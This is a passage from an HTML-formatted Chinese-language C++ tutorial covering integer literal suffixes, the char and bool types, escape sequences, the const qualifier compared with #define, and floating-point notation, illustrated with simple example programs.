class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">process</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Processing unsigned long: &quot;</span> &lt;&lt; n &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">process</span><span class="params">(<span class="keyword">long</span> <span class="keyword">long</span> n)</span> </span>&#123; <span class="comment">// C++11</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Processing long long: &quot;</span> &lt;&lt; n &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">process</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> n)</span> </span>&#123; <span class="comment">// C++11</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Processing unsigned long long: &quot;</span> &lt;&lt; n &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Type of 100: &quot;</span>;</span><br><span class="line">    process(<span class="number">100</span>); <span class="comment">// 通常调用 process(int)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 假设 int 是 32 位，最大值约 21 亿</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Type of 3000000000: &quot;</span>; </span><br><span class="line">    <span class="comment">// 如果 int 是 32 位，这个值超出了 int 范围</span></span><br><span class="line">    <span class="comment">// 编译器会尝试 long 或 long long</span></span><br><span class="line">    process(<span class="number">3000000000</span>); <span class="comment">// 可能调用 process(long) 或 process(long long)</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Type of 0xFFFFFFFF: &quot;</span>; </span><br><span class="line">    <span class="comment">// 这个十六进制数 (等于 4294967295)</span></span><br><span class="line">    <span class="comment">// 如果 int 是 32 位，它超出了有符号 int 的范围</span></span><br><span class="line">    <span class="comment">// 编译器会尝试 unsigned int, long, unsigned long...</span></span><br><span class="line">    process(<span class="number">0xFFFFFFFF</span>); <span class="comment">// 可能调用 process(unsigned int) 或 process(unsigned long)等</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用后缀明确类型</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Type of 150L: &quot;</span>;</span><br><span class="line">    process(<span class="number">150L</span>); <span class="comment">// 明确调用 process(long)</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Type of 200U: &quot;</span>;</span><br><span class="line">    process(<span class="number">200U</span>); <span class="comment">// 明确调用 process(unsigned int)</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Type of 5000000000LL: &quot;</span>;</span><br><span class="line">    process(<span class="number">5000000000L</span>L); <span class="comment">// 明确调用 process(long long)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>关键点:</strong> 如果不确定常量会被推断成什么类型，或者想要确保它是特定类型，最好使用后缀。</p><h3 id="3-1-8-char类型：字符和小整数"><a href="#3-1-8-char类型：字符和小整数" class="headerlink" title="3.1.8 char类型：字符和小整数"></a>3.1.8 char类型：字符和小整数</h3><p><code>char</code> 类型是另一种整型类型，它被设计用来存储**字符 (character)**，例如字母、数字、标点符号等。</p><p><strong>特点:</strong></p><ul><li>  <strong>大小:</strong> <code>char</code> 通常占用 1 个字节（8位）的内存。这是C++标准保证的 (<code>sizeof(char)</code> 总是 1)。</li><li>  <strong>字符表示:</strong> 计算机内部使用数值编码（如 ASCII 或 Unicode 的子集）来表示字符。<code>char</code> 变量存储的是这些字符对应的整数编码。</li><li>  <strong>字符字面值:</strong> 使用单引号 <code>&#39; &#39;</code> 括起来表示单个字符字面值，例如 <code>&#39;A&#39;</code>, <code>&#39;a&#39;</code>, <code>&#39;5&#39;</code>, <code>&#39;?&#39;</code>, <code>&#39;\n&#39;</code> (换行符)。</li><li>  <strong>整数类型:</strong> <code>char</code> 本质上仍然是一个整数类型。它可以参与算术运算。</li><li><strong>有符号 vs 无符号:</strong> <code>char</code> 类型具体是有符号 (<code>signed char</code>) 还是无符号 (<code>unsigned char</code>) 取决于编译器实现。如果你需要明确，可以直接使用 <code>signed char</code> 或 <code>unsigned char</code>。<ul><li>  <code>signed char</code>: 范围通常是 -128 到 127。</li><li>  <code>unsigned char</code>: 范围通常是 0 到 255。</li></ul></li></ul><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> grade = <span class="string">&#x27;A&#x27;</span>; <span class="comment">// 存储字符 &#x27;A&#x27;</span></span><br><span class="line">    <span class="keyword">char</span> initial = <span class="string">&#x27;J&#x27;</span>;</span><br><span class="line">    <span class="keyword">char</span> symbol = <span class="string">&#x27;$&#x27;</span>;</span><br><span class="line">    <span class="keyword">char</span> newline = <span class="string">&#x27;\n&#x27;</span>; <span class="comment">// 存储换行符 (转义序列)</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Your grade is: &quot;</span> &lt;&lt; grade &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Initial: &quot;</span> &lt;&lt; initial &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Symbol: &quot;</span> &lt;&lt; symbol &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Printing a newline:&quot;</span> &lt;&lt; newline; <span class="comment">// 输出一个换行</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After newline.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// cout 会将 char 类型解释为字符进行打印</span></span><br><span class="line">    <span class="comment">// 如果想看到字符对应的整数编码，需要进行类型转换</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;The integer code for &#x27;A&#x27; is: &quot;</span> &lt;&lt; <span class="keyword">int</span>(grade) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; </span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;The integer code for &#x27;$&#x27; is: &quot;</span> &lt;&lt; <span class="keyword">static_cast</span>&lt;<span class="keyword">int</span>&gt;(symbol) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// char 作为小整数使用</span></span><br><span class="line">    <span class="keyword">char</span> small_num = <span class="number">65</span>; <span class="comment">// 65 是 ASCII 码中 &#x27;A&#x27; 的值</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Character with code 65: &quot;</span> &lt;&lt; small_num &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 &#x27;A&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 算术运算</span></span><br><span class="line">    <span class="keyword">char</span> next_char = grade + <span class="number">1</span>; <span class="comment">// &#x27;A&#x27; 的编码加 1 得到 &#x27;B&#x27; 的编码</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Character after &#x27;A&#x27;: &quot;</span> &lt;&lt; next_char &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 &#x27;B&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 输入字符</span></span><br><span class="line">    <span class="keyword">char</span> response;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter a character: &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; response; <span class="comment">// 读取一个字符</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;You entered: &quot;</span> &lt;&lt; response &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Its code is: &quot;</span> &lt;&lt; <span class="keyword">int</span>(response) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 明确使用 signed/unsigned char</span></span><br><span class="line">    <span class="keyword">signed</span> <span class="keyword">char</span> sc = <span class="number">-5</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> uc = <span class="number">250</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Signed char: &quot;</span> &lt;&lt; <span class="keyword">int</span>(sc) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 转换为 int 打印数值</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Unsigned char: &quot;</span> &lt;&lt; <span class="keyword">int</span>(uc) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>转义序列 (Escape Sequence):</strong><br>以反斜杠 <code>\</code> 开头的特殊字符序列，用于表示无法直接输入的字符或具有特殊含义的字符。常用转义序列包括：</p><ul><li>  <code>\n</code>: 换行符</li><li>  <code>\t</code>: 水平制表符 (Tab)</li><li>  <code>\r</code>: 回车符</li><li>  <code>\\</code>: 反斜杠本身</li><li>  <code>\&#39;</code>: 单引号</li><li>  <code>\&quot;</code>: 双引号</li><li>  <code>\?</code>: 问号</li><li>  <code>\0</code>: 空字符 (Null character)</li><li>  <code>\xhh</code>: 用两位十六进制数 hh 表示字符</li><li>  <code>\ooo</code>: 用最多三位八进制数 ooo 表示字符</li></ul><h3 id="3-1-9-bool类型"><a href="#3-1-9-bool类型" class="headerlink" title="3.1.9 bool类型"></a>3.1.9 bool类型</h3><p><code>bool</code> 类型是C++中的<strong>布尔 (Boolean)</strong> 类型，用于表示逻辑值：<strong>真 (true)</strong> 或 **假 (false)**。</p><p><strong>特点:</strong></p><ul><li>  <strong>取值:</strong> <code>bool</code> 变量只能存储两个值：<code>true</code> 和 <code>false</code>。这两个是C++关键字。</li><li><strong>整数转换:</strong><ul><li>  在需要整数的地方，<code>true</code> 会被转换为 <code>1</code>，<code>false</code> 会被转换为 <code>0</code>。</li><li>  在需要布尔值的地方，任何非零整数值会被转换为 <code>true</code>，零值会被转换为 <code>false</code>。指针类型也可以转换为 <code>bool</code>（空指针为 <code>false</code>，非空指针为 <code>true</code>）。</li></ul></li><li>  <strong>大小:</strong> <code>bool</code> 类型的大小没有严格规定，但通常是 1 个字节，即使它只需要 1 位来存储信息。</li><li>  <strong>用途:</strong> 主要用于存储条件判断（如 <code>if</code> 语句、循环条件）的结果。</li></ul><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">bool</span> isReady = <span class="literal">true</span>; <span class="comment">// 声明并初始化为 true</span></span><br><span class="line">    <span class="keyword">bool</span> hasError = <span class="literal">false</span>; <span class="comment">// 声明并初始化为 false</span></span><br><span class="line">    <span class="keyword">bool</span> isEmpty; <span class="comment">// 未初始化 (值不确定)</span></span><br><span class="line"></span><br><span class="line">    isEmpty = <span class="literal">false</span>; <span class="comment">// 赋值</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;isReady (default output): &quot;</span> &lt;&lt; isReady &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 通常输出 1</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;hasError (default output): &quot;</span> &lt;&lt; hasError &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 通常输出 0</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;isEmpty (default output): &quot;</span> &lt;&lt; isEmpty &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用 std::boolalpha 控制符以 &quot;true&quot;/&quot;false&quot; 形式输出</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::boolalpha; </span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;isReady (boolalpha): &quot;</span> &lt;&lt; isReady &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 true</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;hasError (boolalpha): &quot;</span> &lt;&lt; hasError &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 false</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;isEmpty (boolalpha): &quot;</span> &lt;&lt; isEmpty &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 false</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::noboolalpha; <span class="comment">// 关闭 boolalpha 格式</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// bool 和整数转换</span></span><br><span class="line">    <span class="keyword">int</span> ready_int = isReady; <span class="comment">// ready_int 变为 1</span></span><br><span class="line">    <span class="keyword">int</span> error_int = hasError; <span class="comment">// error_int 变为 0</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;isReady as int: &quot;</span> &lt;&lt; ready_int &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;hasError as int: &quot;</span> &lt;&lt; error_int &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">bool</span> from_int_non_zero = <span class="number">100</span>; <span class="comment">// 100 (非零) 转换为 true</span></span><br><span class="line">    <span class="keyword">bool</span> from_int_zero = <span class="number">0</span>;     <span class="comment">// 0 转换为 false</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::boolalpha;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Bool from 100: &quot;</span> &lt;&lt; from_int_non_zero &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 true</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Bool from 0: &quot;</span> &lt;&lt; from_int_zero &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;     <span class="comment">// 输出 false</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在条件语句中使用</span></span><br><span class="line">    <span class="keyword">if</span> (isReady) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;System is ready.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;System is not ready.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!hasError) &#123; <span class="comment">// ! 是逻辑非运算符</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;No errors detected.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;An error occurred.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-2-const限定符"><a href="#3-2-const限定符" class="headerlink" title="3.2 const限定符"></a>3.2 const限定符</h2><p>现在我们来探讨一种在C++中创建<strong>常量 (Constant)</strong> 的更可靠的方法：使用 <code>const</code> 限定符。常量是指在程序运行期间其值不能被修改的量。</p><p><code>const</code> 是一个**类型限定符 (Type Qualifier)**，它用于修改变量的声明，使其成为只读。</p><p><strong>作用:</strong></p><ul><li>  <strong>创建符号常量:</strong> <code>const</code> 允许你为常量值（如圆周率、最大尝试次数等）赋予一个有意义的名称，提高代码的可读性和可维护性。</li><li>  <strong>防止意外修改:</strong> 一旦变量被声明为 <code>const</code> 并初始化后，编译器会阻止任何试图修改该变量值的代码。这有助于防止因意外赋值而导致的错误。</li><li>  <strong>类型安全:</strong> 与使用 <code>#define</code> 创建宏常量相比，<code>const</code> 常量具有明确的数据类型，编译器可以对其进行类型检查，更加安全。</li><li>  <strong>作用域:</strong> <code>const</code> 常量遵循标准的作用域规则（例如，在函数内部定义的 <code>const</code> 常量只在该函数内有效），而 <code>#define</code> 宏是全局替换。</li></ul><p><strong>声明和初始化:</strong></p><p>声明 <code>const</code> 变量的语法是在类型名前或类型名后加上 <code>const</code> 关键字。<strong>关键在于，<code>const</code> 变量必须在声明时进行初始化</strong>，因为之后就不能再给它赋值了。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> type variableName = value; </span><br><span class="line"><span class="comment">// 或者</span></span><br><span class="line">type <span class="keyword">const</span> variableName = value; <span class="comment">// 两种写法等效，第一种更常见</span></span><br></pre></td></tr></table></figure><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 声明并初始化 const 变量</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> MONTHS_IN_YEAR = <span class="number">12</span>; <span class="comment">// 常量，表示一年中的月份数</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">double</span> PI = <span class="number">3.14159</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* GREETING = <span class="string">&quot;Hello, world!&quot;</span>; <span class="comment">// 指向常量字符串的常量指针 (更复杂，后续章节详解)</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 尝试修改 const 变量会导致编译错误</span></span><br><span class="line">    <span class="comment">// MONTHS_IN_YEAR = 13; // 错误! 不能给 const 变量赋值</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Months in a year: &quot;</span> &lt;&lt; MONTHS_IN_YEAR &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">double</span> radius = <span class="number">5.0</span>;</span><br><span class="line">    <span class="keyword">double</span> circumference = <span class="number">2</span> * PI * radius; <span class="comment">// 使用 const 常量 PI</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Circumference: &quot;</span> &lt;&lt; circumference &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// const 常量也遵循作用域规则</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">int</span> MAX_TRIES = <span class="number">3</span>; <span class="comment">// 只在 if 块内有效</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Max tries inside block: &quot;</span> &lt;&lt; MAX_TRIES &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; MAX_TRIES; // 错误! MAX_TRIES 在此作用域外不可见</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 必须在声明时初始化</span></span><br><span class="line">    <span class="comment">// const int DAYS_IN_WEEK; // 错误! const 变量需要初始化</span></span><br><span class="line">    <span class="comment">// DAYS_IN_WEEK = 7; </span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong><code>const</code> 与 <code>#define</code> 的比较:</strong></p><p>在 C 语言中，通常使用 <code>#define</code> 预处理器指令来创建符号常量：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MONTHS_IN_YEAR 12 <span class="comment">// C 风格宏定义</span></span></span><br></pre></td></tr></table></figure><p>虽然 <code>#define</code> 也能达到类似目的，但 <code>const</code> 在 C++ 中通常是更好的选择：</p><ol><li> <strong>类型安全:</strong> <code>const</code> 常量有明确的数据类型，编译器会进行类型检查。<code>#define</code> 只是简单的文本替换，没有类型信息，可能导致意外错误。</li><li> <strong>作用域:</strong> <code>const</code> 常量遵循 C++ 的作用域规则，可以创建局部常量。<code>#define</code> 宏通常是全局的（从定义点到文件尾），容易造成命名冲突。</li><li> <strong>调试:</strong> <code>const</code> 常量在调试器中通常可见，有符号名。<code>#define</code> 宏在编译前就被替换掉了，调试时可能只能看到替换后的字面值。</li><li> <strong>类作用域:</strong> <code>const</code> 可以用于定义类作用域内的常量（类成员），而 <code>#define</code> 不能直接做到这一点。</li></ol><p><strong>一般建议:</strong> 在 C++ 中，优先使用 <code>const</code> 来定义符号常量，而不是 <code>#define</code>。</p><h2 id="3-3-浮点数"><a href="#3-3-浮点数" class="headerlink" title="3.3 浮点数"></a>3.3 浮点数</h2><p>浮点数是C++中用于表示带小数部分的数字（实数）的类型。它们可以表示非常大或非常小的数值，以及整数无法表示的小数。</p><h3 id="3-3-1-书写浮点数"><a href="#3-3-1-书写浮点数" class="headerlink" title="3.3.1 书写浮点数"></a>3.3.1 书写浮点数</h3><p>C++允许使用两种方式来书写浮点字面值（常量）：</p><ol><li><p><strong>标准小数点表示法 (Standard Decimal Point Notation):</strong></p><ul><li>  包含一个小数点。</li><li>  例如：<code>12.34</code>, <code>0.0</code>, <code>99.</code>, <code>.5</code> (等同于 0.5), <code>-1.67</code>。</li></ul></li><li><p><strong>E表示法 (E Notation) 或科学记数法 (Scientific Notation):</strong></p><ul><li>  用于表示非常大或非常小的数。</li><li>  格式为：<code>mantissaEexponent</code> 或 <code>mantissaeexponent</code>。</li><li>  <code>mantissa</code> (尾数) 是一个数字（可以带小数点）。</li><li>  <code>E</code> 或 <code>e</code> 表示 “乘以10的…次幂”。</li><li>  <code>exponent</code> (指数) 是一个整数（可以为负）。</li><li>例如：<ul><li>  <code>3.45E6</code> 表示 3.45 * 10<sup>6</sup> (即 3,450,000)。</li><li>  <code>2.5e-4</code> 表示 2.5 * 10<sup>-4</sup> (即 0.00025)。</li><li>  <code>9E12</code> 表示 9 * 10<sup>12</sup>。</li><li>  <code>-1.23e+3</code> 表示 -1.23 * 10<sup>3</sup> (即 -1230)。</li></ul></li></ul></li></ol><p><strong>注意:</strong></p><ul><li>  E表示法中，<code>E</code> 或 <code>e</code> 前后不能有空格。</li><li>  指数必须是整数。</li></ul><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span 